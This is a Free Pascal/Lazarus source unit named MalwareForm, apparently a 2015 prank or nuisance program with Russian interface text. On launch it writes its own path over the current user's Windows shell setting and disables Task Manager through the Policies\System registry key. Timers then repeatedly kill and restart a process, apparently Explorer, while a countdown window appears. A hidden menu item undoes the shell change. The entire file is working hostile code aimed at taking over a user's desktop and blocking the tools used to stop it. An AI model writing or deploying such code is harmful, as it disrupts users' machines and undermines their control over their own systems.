unit MalwareForm;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, FileUtil, Forms, Controls, Graphics, Dialogs, StdCtrls,
  ExtCtrls, AsyncProcess, Menus, Process, dateutils, registry;

type

  { TForm1 }

  TForm1 = class(TForm)
    AsyncProcessKill: TAsyncProcess;
    AsyncProcessStart: TAsyncProcess;
    Label1: TLabel;
    MenuItem2: TMenuItem;
    MenuItem3: TMenuItem;
    Panel1: TPanel;
    PopupMenu1: TPopupMenu;
    Timer1: TTimer;
    Timer2: TTimer;
    procedure FormClose(Sender: TObject; var CloseAction: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure MenuItem2Click(Sender: TObject);
    procedure MenuItem3Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
  private
    HideDelaySeconds, ShowDelaySeconds: Integer;
    procedure RegEdit(Key, Value: String);
  public
    { public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.lfm}

{ TForm1 }

procedure TForm1.Timer1Timer(Sender: TObject);
begin
  HideDelaySeconds -= 1;
  if HideDelaySeconds <= 0 then begin
    Timer1.Enabled := False;
    Timer2.Enabled := True;
    ShowDelaySeconds := 15;
    Form1.Show;
    AsyncProcessKill.Execute;
  end;
end;

procedure TForm1.Timer2Timer(Sender: TObject);
const
  SecString: array [0..2] of string = ('секунд', 'секунду', 'секунды');
var
  t: integer;
begin
  ShowDelaySeconds -= 1;
  if ShowDelaySeconds <= 0 then begin
    Timer1.Enabled := True;
    Timer2.Enabled := False;
    HideDelaySeconds := 45;
    Form1.Hide;
    AsyncProcessStart.Execute;
  end;
  t := 0;
  if ShowDelaySeconds mod 10 = 1 then t := 1;
  if (ShowDelaySeconds mod 10) in [2 .. 4] then t := 2;
  if ShowDelaySeconds div 10 = 1 then t := 0;
  Label1.Caption :=  Format('Работа будет продолжена через'#13#10'%d %s',
    [ShowDelaySeconds, SecString[t]]);
end;

procedure TForm1.FormShow(Sender: TObject);
begin
  Timer2.OnTimer(Timer2);
end;

procedure TForm1.MenuItem2Click(Sender: TObject);
begin
  AsyncProcessStart.Execute;
  RegEdit('Shell', 'Explorer.exe');
  Form1.Close;
end;

procedure TForm1.MenuItem3Click(Sender: TObject);
begin
  ShowMessage('Денис Давидюк 2015');
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  RegEdit('Shell', ParamStr(0));
  RegEdit('DisableTaskMgr', '1');
end;

procedure TForm1.FormClose(Sender: TObject; var CloseAction: TCloseAction);
begin
  RegEdit('DisableTaskMgr', '100');
end;

procedure TForm1.RegEdit(Key, Value: String);
begin
  with TRegistry.Create do begin
    RootKey := HKEY_CURRENT_USER;
    if not OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\System', True) then Exit;
    WriteString(Key, Value);
    CloseKey;
    Free;
  end;
end;

end.

